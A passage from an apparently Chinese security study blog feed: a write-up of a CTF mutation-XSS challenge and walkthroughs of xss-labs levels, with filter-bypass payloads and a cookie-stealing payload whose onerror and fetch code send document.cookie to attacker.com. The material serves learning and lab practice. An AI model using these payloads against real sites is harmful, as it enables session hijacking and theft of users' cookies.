json=payload)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Status Code:&quot;</span>, response.status_code)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Response Headers:&quot;</span>)</span><br><span class="line">    pprint.pprint(<span class="built_in">dict</span>(response.headers))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Response Body:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    send_request()</span><br><span class="line">    time.sleep(<span class="number">5</span>)</span><br></pre></td></tr></table></figure><p><img src="/../images/b15c661df6814449eea53b149ea2e999.png" alt="b15c661df6814449eea53b149ea2e999"></p>]]></content>
      
      
      <categories>
          
          <category> 重生我要当web糕手 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一个男人一句话改变我的一生之xss</title>
      <link href="/posts/33318.html"/>
      <url>/posts/33318.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">_sun_.empty.师傅给我看了一道国际赛easy难度的xss题目，实在不会，于是打算复现一下</span><br><span class="line">结果docker的时候xss-bot拉起太慢，使用镜像之后修改文件又出现问题，所以就单纯的白盒审计一下这道题，&quot;意因&quot;一下</span><br><span class="line">这题的点是解析器的标签&quot;空间&quot;问题,以及常见的顺序验证错误【代码审计中常出现的参数可控问题】</span><br><span class="line"></span><br><span class="line">一开始看到这道题的时候还在想是不是自己的xss知识点缺失很大，于是打算整理复现一手关于xss的基础知识，方便以后见到好翻翻笔记</span><br><span class="line">结果是标签问题【更大的盲区，所以后面不涉及css之类的xss，xss原型链污染，dom属性的深层次研究，遇到了再说，嘻嘻】</span><br><span class="line">感谢sun师傅的拷打，让我又又又涨见识了</span><br><span class="line"></span><br><span class="line">这篇文章个人感觉还是很水的，因为感觉东西还是特别多，研究不深</span><br><span class="line">有什么错误的地方希望跟师傅们交流，大师傅快来拷打我，我一定会努力的，呜呜呜。</span><br></pre></td></tr></table></figure><h1 id="mutant"><a href="#mutant" class="headerlink" title="mutant"></a>mutant</h1><p><a href="https://github.com/DownUnderCTF/Challenges_2025_Public/blob/main/web/mutant/">https://github.com/DownUnderCTF/Challenges_2025_Public/blob/main/web/mutant/</a></p><p><img src="/../images/image-20251020163628329.png" alt="image-20251020163628329"></p><p>使用了&lt;template&gt;标签</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;是 HTML5 引入的特殊元素，它的内容被视为&quot;惰性&quot;的：</span><br><span class="line">不会立即渲染</span><br><span class="line">不会执行脚本</span><br><span class="line">不会加载资源</span><br><span class="line">保持内容隔离，直到被激活使用</span><br></pre></td></tr></table></figure><p>if (n.attributes)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">移除所有属性</span><br></pre></td></tr></table></figure><p>if (n.nodeName !&#x3D;&#x3D; “#document-fragment” &amp;&amp;       (n.nodeName.length &#x3D;&#x3D;&#x3D; 6 || n.nodeName.length &#x3D;&#x3D;&#x3D; 8))</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">删除特定长度标签名的元素</span><br></pre></td></tr></table></figure><p>for (let i &#x3D; n.children.length - 1; i &gt;&#x3D; 0; i–)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">深度遍历整个DOM树</span><br></pre></td></tr></table></figure><p>payload解析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;form&gt;</span><br><span class="line">  &lt;math&gt;</span><br><span class="line">    &lt;mtext&gt;&lt;/form&gt;</span><br><span class="line">&lt;form&gt;</span><br><span class="line">  &lt;malignmark&gt;</span><br><span class="line">    &lt;style&gt;&lt;/math&gt;</span><br><span class="line">&lt;img src onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure><ol><li><p>解析器遇到<code>&lt;form&gt;</code>开始标签然后是<code>&lt;math&gt;</code>标签（MathML命名空间）接着是<code>&lt;mtext&gt;</code>标签【这里是mathml的元素】</p></li><li><p><code>&lt;/form&gt;</code>：在MathML命名空间内遇到<code>&lt;/form&gt;</code>【html元素】会触发特殊行为解析器会”关闭”当前表单，解析器对其进行处理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;form&gt;&lt;/form&gt; </span><br><span class="line">&lt;math&gt;&lt;mtext&gt;&lt;/mtext&gt;&lt;/math&gt; </span><br></pre></td></tr></table></figure></li><li><p>后续&lt;style&gt;【是在html的标签，出现在mathml中】,&lt;&#x2F;math&gt;使得解释器混淆触发闭合&lt;form&gt;</p></li><li><p><code>malignmark</code>标签名长度是10，不会被删除<code>style</code>标签名长度是5，不会被删除<code>img</code>标签名长度是3</p></li></ol><p>解释器处理时间：</p><p>DOM 变异在 <code>innerHTML</code>赋值时已经发生</p><p><code>onerror</code>在属性移除前已经生效</p><p>项目会让xss-bot来触发访问该链，要获得其cookie</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form&gt;&lt;math&gt;&lt;mtext&gt;&lt;/form&gt;&lt;form&gt;&lt;malignmark&gt;&lt;style&gt;&lt;/math&gt;&lt;img src=1 onerror=&quot;fetch(`https://attacker.com/steal?cookie=$&#123;encodeURIComponent(document.cookie)&#125;`)&quot;&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fetch(&#x27;https://attacker.com/steal&#x27;, &#123;</span><br><span class="line">  method: &#x27;POST&#x27;,</span><br><span class="line">  headers: &#123;&#x27;Content-Type&#x27;: &#x27;application/json&#x27;&#125;,</span><br><span class="line">  body: JSON.stringify(&#123;</span><br><span class="line">    cookie: document.cookie,</span><br><span class="line">    url: location.href,</span><br><span class="line">    userAgent: navigator.userAgent</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>这是手搓的平台搭建获取cookie方式</p><p>这题的关键点是混淆解析器，在mathml空间中标签和html空间中标签的差异，引起解析器对于异常代码的处理</p><h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><p>有些引用在文章当中</p><p><a href="https://blog.csdn.net/2301_80637449/article/details/153076191">XSS 漏洞全解析：从原理到实战-CSDN博客</a></p><p><a href="https://xz.aliyun.com/news/12336">XSS原理分析与绕过总结-先知社区</a></p><p><a href="https://xz.aliyun.com/news/3699">XSS总结-先知社区</a></p><p><a href="https://www.freebuf.com/vuls/423546.html">XSS 漏洞深度解析：攻防对抗与高阶利用 - FreeBuf网络安全行业门户</a></p><p><a href="https://www.sqlsec.com/2020/10/xss2.html#%E6%80%BB%E7%BB%93">XSS 攻击思路总结 | 国光</a></p><p><a href="https://www.sqlsec.com/2020/01/xss.html">XSS 从零开始 | 国光</a></p><p><a href="https://www.bilibili.com/video/BV123yAYMEwb/?p=53&share_source=copy_web&vd_source=46dcac097257d547144350b30f96978c">https://www.bilibili.com/video/BV123yAYMEwb/?p=53&amp;share_source=copy_web&amp;vd_source=46dcac097257d547144350b30f96978c</a></p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>XSS 是攻击者通过在网页中注入恶意 JavaScript 脚本，当用户访问被注入的页面时，脚本在用户浏览器中执行，从而实现窃取 cookie、劫持会话、钓鱼攻击等恶意操作的漏洞。其本质是Web 应用对用户输入的过滤不严格，导致未经过滤的输入被当作 HTML&#x2F;JavaScript 代码在浏览器中解析执行。</p><h1 id="XSS-分类"><a href="#XSS-分类" class="headerlink" title="XSS 分类"></a>XSS 分类</h1><h2 id="反射型-XSS"><a href="#反射型-XSS" class="headerlink" title="反射型 XSS"></a><strong>反射型 XSS</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">恶意脚本通过 URL 参数传入，服务器未过滤直接返回页面中</span><br><span class="line">非持久化，需诱骗用户点击含恶意参数的 URL</span><br><span class="line">适合钓鱼攻击（如伪造登录链接）、一次性会话劫持</span><br></pre></td></tr></table></figure><h2 id="存储型-XSS"><a href="#存储型-XSS" class="headerlink" title="存储型 XSS"></a><strong>存储型 XSS</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">恶意脚本被存储到服务器（如数据库、文件），用户访问页面时被加载执行</span><br><span class="line">持久化，所有访问该页面的用户都会触发</span><br><span class="line">危害最大，可批量攻击（如论坛、留言板）、长期控制目标</span><br></pre></td></tr></table></figure><h2 id="DOM-型-XSS"><a href="#DOM-型-XSS" class="headerlink" title="DOM 型 XSS"></a><strong>DOM 型 XSS</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">恶意脚本未经过服务器，仅在客户端通过 JavaScript 操作 DOM 时注入</span><br><span class="line">完全在客户端执行，服务器响应中无恶意代码</span><br><span class="line">难被服务器端 WAF 检测，适合绕过防护机制</span><br></pre></td></tr></table></figure><h1 id="xss靶场"><a href="#xss靶场" class="headerlink" title="xss靶场"></a>xss靶场</h1><h2 id="xss-lab"><a href="#xss-lab" class="headerlink" title="xss-lab"></a>xss-lab</h2><p>【基础认识】</p><p><a href="https://www.cnblogs.com/L00kback/p/17552275.html">xss-labs靶场1-20关详解 - L00kback - 博客园</a></p><p><a href="https://skywt.cn/blog/xss-labs-tutorial#level-1%E6%96%87%E6%9C%AC%E8%A7%A3%E6%9E%90%E4%B8%BA-html">xss-labs 通关教程 - 博客</a></p><h3 id="leve1"><a href="#leve1" class="headerlink" title="leve1"></a>leve1</h3><p><img src="/../images/image-20251017141145726.png" alt="image-20251017141145726"></p><p>代码直接将从URL参数<code>name</code>获取的用户输入（<code>$str</code>）拼接进HTML页面输出</p><p>没有进行任何过滤或转义处理,直接注入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="leve2"><a href="#leve2" class="headerlink" title="leve2"></a>leve2</h3><p><img src="/../images/image-20251017141918087.png" alt="image-20251017141918087"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">htmlspecialchars($str)  将字符串中的特殊字符转换为HTML实体</span><br></pre></td></tr></table></figure><p>但是在表单当中的value值没有进行过滤，在这里可以进行构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">将这一句的value=&quot;x&quot;&gt;</span><br><span class="line">x如果填入&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;就等于插入了一句js代码</span><br><span class="line">value=&quot;&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="leve3"><a href="#leve3" class="headerlink" title="leve3"></a>leve3</h3><p><img src="/../images/image-20251017142811091.png" alt="image-20251017142811091"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">在 8.1.0 及以上的 PHP 版本中，这个函数默认会转义 &lt;、&gt;、&amp;、&#x27;、&quot; 这五个字符，基本可以防范这里的 XSS 攻击。</span><br><span class="line">但是，8.1.0 以下版本的 PHP 默认只会转义 &lt;、&gt;、&amp;、&quot; 这四个字符，不会转义单引号 &#x27;。这就给这个函数带来了巨大的安全隐患。</span><br><span class="line"></span><br><span class="line">&lt;8.1.0</span><br><span class="line">htmlspecialchars()函数把预定义的字符转换为 HTML 实体</span><br><span class="line">预定义的字符有：</span><br><span class="line"> &amp; （和号）成为 &amp;amp;</span><br><span class="line"> &quot; （双引号）成为 &amp;quot;</span><br><span class="line"> &#x27; （单引号）成为 &#x27;</span><br><span class="line"> &lt; （小于）成为 &amp;lt;</span><br><span class="line"> &gt; （大于）成为 &amp;gt;</span><br></pre></td></tr></table></figure><p>那么就可以使用’来闭合value&#x3D;’’ 但是&lt;被过滤成了&amp;1t 那么就构造不出额外的语句，在句内构造可以使用到触发器鼠标点击事件<code>onfocus``onclinck``onmouseover</code>等。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27; onmouseover=javascript:alert(1)</span><br><span class="line">&#x27; onclick=&#x27;alert(1)</span><br></pre></td></tr></table></figure><h3 id="leve4"><a href="#leve4" class="headerlink" title="leve4"></a>leve4</h3><p><img src="/../images/image-20251017144147810.png" alt="image-20251017144147810"></p><p>这里的value没有使用htmlspecialchar()来转义，但是使用了str_replace()来将&lt;和&gt;转化成空格 可以使用””闭合value构造payload 但是不能使用&lt;和&gt; 那就可以继续使用触发器来进行过滤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;onclick=&quot;alert(1)</span><br><span class="line">&quot;onmouseover=alert(1)&quot;</span><br></pre></td></tr></table></figure><h3 id="leve5"><a href="#leve5" class="headerlink" title="leve5"></a>leve5</h3><p><img src="/../images/image-20251017145015924.png" alt="image-20251017145015924"></p><p>这里的value依旧没有使用htmlspecialchar()来转义，但是使用了str_replace()来将&lt;script和on转化带下划线的形式 说明不能使用鼠标触发事件了因为都带着on，可以利用 JavaScript 的 URI</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a&gt; 标签的 href 值并非只能是 URL，而是 URI。URI（Uniform Resource Identifier）可以视为 URL 的超集，其不仅包含以 protocol://address 开头的 URL，也包含 protocol:content 这种形式的地址（参见 RFC 3986）。经常用到的有：javascript: 后接 js 代码，这样的 URI 打开后会运行一段 js 代码；mailto: 后接一个邮箱，这样的 URI 打开后会开启系统中的邮箱类应用程序，创建发送给目标地址的一封邮件。</span><br></pre></td></tr></table></figure><p>使用”&gt;闭合前一句，再构造<a></a>语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a href=javascript:alert(1)&gt;</span><br></pre></td></tr></table></figure><h3 id="leve6"><a href="#leve6" class="headerlink" title="leve6"></a>leve6</h3><p><img src="/../images/image-20251017145811434.png" alt="image-20251017145811434"></p><p>过滤增加了src,data,href</p><p>HTML 并不区分大小写,所以所以将 href 替换大小写就好了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a hrEf=javascript:alert(1)&gt;</span><br></pre></td></tr></table></figure><h3 id="leve7"><a href="#leve7" class="headerlink" title="leve7"></a>leve7</h3><p>跟6不一样是简单过滤，而是全部置空了</p><p><img src="/../images/image-20251017174535233.png" alt="image-20251017174535233"></p><p>经典的只过滤了一次，只要构造了过滤之后还是能使用的payload就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;scriscriptpt&gt;alert(1);&lt;/scriscriptpt&gt;</span><br></pre></td></tr></table></figure><h3 id="leve8"><a href="#leve8" class="headerlink" title="leve8"></a>leve8</h3><p><img src="/../images/image-20251017183446774.png" alt="image-20251017183446774"></p><p>value的值被htmlspecialchars()函数过滤了，但是在<a>标签当中还有</p><p>想要构造javascript:alert(1)，但是会变成javascr_ipt</p><p>href的属性：href 传入的 URI 中，也可以使用 HTML 字符实体。在打开链接时，字符实体也会被转换为对应的字符。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HTML 实体有两种写法，第一种是之前提到的 &amp;entity_name; 形式，比如 $lt; 表示小于号；第二种是 &amp;#entity_number; 形式，其中 entity_number 是字符的实体编号，比如 &amp;#60; 也能表示小于号。使用第二种方式，任何字符（包括 ASCII 字符）都有其实体表示。</span><br></pre></td></tr></table></figure><p>那么只要对payload进行html实体转化就可【全局和部分都可以】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javascr&amp;#x69;pt:alert(1)</span><br><span class="line">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;</span><br></pre></td></tr></table></figure><h3 id="leve9"><a href="#leve9" class="headerlink" title="leve9"></a>leve9</h3><p><img src="/../images/image-20251018002224373.png" alt="image-20251018002224373"></p><p>在8的基础上对加友链进行了验证是否含有http:&#x2F;&#x2F;字符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">strpos()</span><br><span class="line">函数用于在字符串中查找子字符串http://的位置。如果找到了子字符串，则返回子字符串的起始位置（也就是一个非负整数值）。如果没有找到子字符串，则返回false。</span><br></pre></td></tr></table></figure><p>那么就可以开始改造8的payload,将http:&#x2F;&#x2F;注释掉就可以了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascr&amp;#x69;pt:alert(1)//http://</span><br></pre></td></tr></table></figure><h3 id="leve10"><a href="#leve10" class="headerlink" title="leve10"></a>leve10</h3><p><img src="/../images/image-20251018004243477.png" alt="image-20251018004243477"></p><p>有三个表单是hidden的，但是只有t_sort可以get控制以及参与解析</p><p>关于&lt;&gt;的过滤就可以闭合value使用鼠标事件，以及hidden可以使用type对后面的hidden进行重置就不用在html上面改出表单再提交了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?keyword=1&amp;t_sort=&quot; onclick=&quot;alert(1)&quot; type &quot;</span><br><span class="line">?keyword=1&amp;t_sort=&quot; onmouseover=javascript:alert(1) type &quot;</span><br></pre></td></tr></table></figure><h3 id="leve11"><a href="#leve11" class="headerlink" title="leve11"></a>leve11</h3><p><img src="/../images/image-20251018005131086.png" alt="image-20251018005131086"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_SERVER[&#x27;HTTP_REFERER&#x27;]是一个PHP超全局变量，用于获取当前页面的前一个页面的URL地址。</span><br></pre></td></tr></table></figure><p>跟10的区别就是将payload放到了ref头上</p><p><img src="/../images/image-20251018005401956.png" alt="image-20251018005401956"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Referer：&quot; onclick=&quot;alert(1)&quot; type &quot;</span><br><span class="line">Referer：&quot; onmouseover=javascript:alert(1) type &quot;</span><br></pre></td></tr></table></figure><h3 id="leve12"><a href="#leve12" class="headerlink" title="leve12"></a>leve12</h3><p><img src="/../images/image-20251018005528385.png" alt="image-20251018005528385"></p><p>和前面的一样，将payload改到了ua头上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-Agent：&quot; onclick=&quot;alert(1)&quot; type &quot;</span><br><span class="line">User-Agent：&quot; onmouseover=javascript:alert(1) type &quot;</span><br></pre></td></tr></table></figure><h3 id="leve13"><a href="#leve13" class="headerlink" title="leve13"></a>leve13</h3><p><img src="/../images/image-20251018005742527.png" alt="image-20251018005742527"></p><p>和前面的一样，将payload改到了cookie头上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Cookie：user=&quot; onclick=&quot;alert(1)&quot; type &quot;</span><br><span class="line">Cookie：user=&quot; onmouseover=javascript:alert(1) type &quot;</span><br></pre></td></tr></table></figure><h3 id="leve14"><a href="#leve14" class="headerlink" title="leve14"></a>leve14</h3><p>【链接无效】</p><p><img src="/../images/image-20251018010324147.png" alt="image-20251018010324147"></p><p>查看图片 exif 信息的网站</p><p>修改iframe调用的文件来实现xss注入</p><h3 id="leve15"><a href="#leve15" class="headerlink" title="leve15"></a>leve15</h3><p><img src="/../images/image-20251018010603698.png" alt="image-20251018010603698"></p><p>在 URL 中指定的 src（默认是 1.gif）会被引用进来，使用的是 ng-include。这是一个 Angular 框架的功能，特点是，如果引入的是 HTML 文件，不会执行其中 <code>&lt;script&gt;</code> 标签内的代码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?src=level1.php?name=&lt;img src=1 onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure><p>这里直接引用leve1的payload，当然可以自己构造</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hacked<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">img</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>假设放在网站根目录，payload 就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?src=&quot;/alert.html&quot;</span><br></pre></td></tr></table></figure><h3 id="leve16"><a href="#leve16" class="headerlink" title="leve16"></a>leve16</h3><p><img src="/../images/image-20251018011553675.png" alt="image-20251018011553675"></p><p>对空格进行了过滤，使用换行符（<code>%0A</code>）或者<code>%0d</code>也可以</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?keyword=&lt;img%0Asrc=1%0Aonerror=&quot;alert(1)&quot;&gt;</span><br><span class="line">?keyword=&lt;svg%0Aonload=&quot;alert(1)&gt;&quot;</span><br></pre></td></tr></table></figure><h3 id="leve17"><a href="#leve17" class="headerlink" title="leve17"></a>leve17</h3><p><img src="/../images/image-20251018013156996.png" alt="image-20251018013156996"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;embed&gt; 标签用于在HTML页面中嵌入外部内容，如多媒体文件、插件或其他交互式内容。它是HTML5的一部分。</span><br><span class="line">以下是 &lt;embed&gt; 标签的基本语法：</span><br><span class="line">&lt;embed src=&quot;URL&quot; type=&quot;MIME-类型&quot; width=&quot;宽度&quot; height=&quot;高度&quot;&gt;</span><br><span class="line">常用的属性包括：</span><br><span class="line">src：指定要嵌入的外部资源的URL。可以是音频、视频、SWF 文件等。</span><br><span class="line">type：指定被嵌入资源的MIME类型。</span><br><span class="line">width：指定嵌入内容的宽度（像素或百分比）。</span><br><span class="line">height：指定嵌入内容的高度（像素或百分比）。</span><br></pre></td></tr></table></figure><p>这两个变量是互相拼接起来的，所以在输入arg02时在b之后加一个空格，当浏览器解析到b的时候就停止判断，然后将onclick或onmouseover看作另外一个属性。从而执行JavaScript语句。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?arg01=a&amp;arg02=b onmousemove=&#x27;alert(1)&#x27; </span><br><span class="line">?arg01=a&amp;arg02=b onclick=&#x27;alert(1)&#x27;</span><br></pre></td></tr></table></figure><h3 id="leve18"><a href="#leve18" class="headerlink" title="leve18"></a>leve18</h3><p>和17一样</p><p><img src="/../images/image-20251018014118392.png" alt="image-20251018014118392"></p><h3 id="leve19"><a href="#leve19" class="headerlink" title="leve19"></a>leve19</h3><p>后面的flash有点看不懂了，但是也是古老的东西先放着吧</p><h1 id="文件上传配合xss"><a href="#文件上传配合xss" class="headerlink" title="文件上传配合xss"></a>文件上传配合xss</h1><p>前面用了这个xss-lab来了解了基础的xss知识，那么下面来认识特殊的几种的xss系列，svg-pdf-flash-mxss-uxss。【这里不展开说明如何制作，详情可以看小迪老师的b站视频<a href="https://www.bilibili.com/video/BV123yAYMEwb/?spm_id_from=333.1387.0.0&vd_source=3cad66818fbd72b6100b5f159983493b">【小迪安全】全栈网络安全 | 渗透测试 | 高级红蓝对抗 V2024最新版 (完)_哔哩哔哩_bilibili</a>】</p><h2 id="svg-xss"><a href="#svg-xss" class="headerlink" title="svg-xss"></a>svg-xss</h2><p>SVG(Scalable Vector Graphics)是一种基于XML的二维矢量图格式，和我们平常用的jpg&#x2F;png等图片格式所不同的是SVG图像在放大或改变尺寸的情况下其图形质量不会有所损失，并且我们可以使用任何的文本编辑器打开SVG图片并且编辑它，目前主流的浏览器都已经支持SVG图片的渲染。</p><h2 id="pdf-xss"><a href="#pdf-xss" class="headerlink" title="pdf-xss"></a>pdf-xss</h2><p>PDF XSS（PDF 跨站脚本）漏洞是指攻击者通过在 PDF 文件中植入恶意 JavaScript 代码，利用 PDF 阅读器或在线预览工具的安全缺陷，实现代码执行的一类漏洞。与传统网页 XSS 不同，PDF XSS 的载体是 PDF 文件，攻击场景更隐蔽，且依赖于 PDF 处理工具的解析逻辑。</p><h2 id="swf-xss"><a href="#swf-xss" class="headerlink" title="swf-xss"></a>swf-xss</h2><p>SWF XSS 是一种通过 Flash 文件（SWF）中的漏洞执行跨站脚本攻击的技术。攻击者可以利用 SWF 文件中未正确处理的输入参数，注入恶意 JavaScript 代码，从而在目标用户的浏览器中执行。</p><h1 id="突变体xss"><a href="#突变体xss" class="headerlink" title="突变体xss"></a>突变体xss</h1><h2 id="mxss"><a href="#mxss" class="headerlink" title="mxss"></a>mxss</h2><p>预览</p><p><a href="https://blog.csdn.net/weixin_34087301/article/details/87982018?fromshare=blogdetail&sharetype=blogdetail&sharerId=87982018&sharerefer=PC&sharesource=2403_87580523&sharefrom=from_link">https://blog.csdn.net/weixin_34087301/article/details/87982018?fromshare=blogdetail&amp;sharetype=blogdetail&amp;sharerId=87982018&amp;sharerefer=PC&amp;sharesource=2403_87580523&amp;sharefrom=from_link</a></p><h2 id="uxss"><a href="#uxss" class="headerlink" title="uxss"></a>uxss</h2><p>翻译</p><p>UXSS保留了基本XSS的特点，利用漏洞，执行恶意代码，但是有一个重要的区别：<strong>不同于常见的XSS，UXSS是一种利用浏览器或者浏览器扩展漏洞来制造产生XSS的条件并执行代码的一种攻击类型。</strong></p><p><a href="https://juejin.cn/post/7031788659221200927">通用跨站脚本攻击(UXSS)什么是UXSS？ 大家都知道有反射型XSS、存储型XSS、DomXSS，还有之前wooyun - 掘金</a></p><h1 id="平台搭建"><a href="#平台搭建" class="headerlink" title="平台搭建"></a>平台搭建</h1><h2 id="beef-xss"><a href="#beef-xss" class="headerlink" title="beef-xss"></a>beef-xss</h2><p><a href="https://www.freebuf.com/articles/web/443592.html">XSS之Beef简单使用 - FreeBuf网络安全行业门户</a></p><p>docker拉取比较快捷方便</p><h2 id="蓝莲花xss"><a href="#蓝莲花xss" class="headerlink" title="蓝莲花xss"></a>蓝莲花xss</h2><p><a href="https://blog.csdn.net/weixin_43263566/article/details/128848268">XSS 进阶篇：一文全面了解蓝莲花基本用法_xss蓝莲花-CSDN博客</a></p><p><a href="https://github.com/firesunCN/BlueLotus_XSSReceiver">https://github.com/firesunCN/BlueLotus_XSSReceiver</a></p><h2 id="手搓"><a href="#手搓" class="headerlink" title="手搓"></a>手搓</h2><figure class="highlight 